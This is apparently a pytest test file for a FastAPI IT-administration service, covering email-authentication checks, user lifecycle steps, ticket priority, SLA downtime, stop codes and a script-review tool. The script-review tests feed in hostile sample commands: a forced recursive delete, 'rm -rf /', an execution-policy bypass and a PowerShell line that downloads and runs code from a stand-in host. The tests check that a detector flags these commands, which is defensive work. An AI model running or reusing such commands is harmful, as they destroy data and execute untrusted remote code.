from fastapi.testclient import TestClient

from app.main import app
from app.services import agent_tools, it_admin, it_repair, repair_search

c = TestClient(app)


def test_email_auth_flags():
    r = c.post("/api/itadmin/email-auth", json={"spf": "v=spf1 include:a.com include:b.com +all", "dmarc": "v=DMARC1; p=none", "dkim": "v=DKIM1; k=rsa; p="}).json()
    txt = " ".join(f["problem"] for f in r["findings"])
    assert "+all" in txt and "p=none" in txt and "rua" in txt and "revoked" in txt
    good = c.post("/api/itadmin/email-auth", json={"spf": "v=spf1 include:spf.protection.outlook.com -all", "dmarc": "v=DMARC1; p=reject; rua=mailto:d@x.com; pct=100"}).json()
    assert not [f for f in good["findings"] if f["severity"] == "high"]
    many = "v=spf1 " + " ".join(f"include:s{i}.com" for i in range(12)) + " -all"
    assert any("lookups" in f["problem"] for f in c.post("/api/itadmin/email-auth", json={"spf": many}).json()["findings"])
    assert c.post("/api/itadmin/email-auth", json={}).status_code == 400


def test_lifecycle_priority_sla_stop():
    on = c.post("/api/itadmin/lifecycle", json={"kind": "onboard", "name": "Sam", "role": "front desk"}).json()
    off = c.post("/api/itadmin/lifecycle", json={"kind": "offboard", "name": "Sam"}).json()
    assert any("multi-factor" in s for s in on["steps"]) and any("sessions" in s for s in off["steps"])
    assert c.post("/api/itadmin/lifecycle", json={"kind": "x"}).status_code == 400
    assert c.post("/api/itadmin/priority", json={"impact": "high", "urgency": "high"}).json()["priority"] == "P1"
    assert c.post("/api/itadmin/priority", json={"impact": "low", "urgency": "low"}).json()["priority"] == "P5"
    assert c.post("/api/itadmin/sla", json={"available_pct": 99.9, "window_days": 30}).json()["allowed_downtime_minutes"] == 43.2
    assert c.post("/api/itadmin/stop-code", json={"code": "irql not less"}).json()["matches"]
    assert c.post("/api/itadmin/stop-code", json={"code": "zz"}).status_code == 400


def test_script_review_hides_secret():
    t = 'Remove-Item C:\\data -Recurse -Force\n$password = "Hunter2Hunter2"\nSet-ExecutionPolicy Bypass\niex (iwr http://x.com/a.ps1)\n'
    r = c.post("/api/itadmin/script-review", json={"text": t}).json()
    assert r["counts"]["high"] >= 4 and "Hunter2Hunter2" not in str(r)


def test_guides_and_tools():
    ids = {g["id"] for g in it_repair.GUIDES}
    assert {"adm-bsod", "adm-boot", "adm-profile", "adm-malware", "adm-ransom", "adm-recover", "adm-intune", "adm-mac", "adm-linux", "adm-printer", "adm-voip"} <= ids
    assert repair_search.search("blue screen stop code", 3)["results"][0]["id"] == "adm-bsod"
    t, e = agent_tools.run_tool("itsupport", {"tool": "email_auth", "args": {"spf": "v=spf1 ~all"}})
    assert not e
    t, e = agent_tools.run_tool("itsupport", {"tool": "script_review", "args": {"text": "rm -rf /"}})
    assert not e and "delete" in t
    t, e = agent_tools.run_tool("itsupport", {"tool": "stop_code", "args": {"code": "CRITICAL_PROCESS_DIED"}})
    assert not e
    assert it_admin.reference()["snippets"]
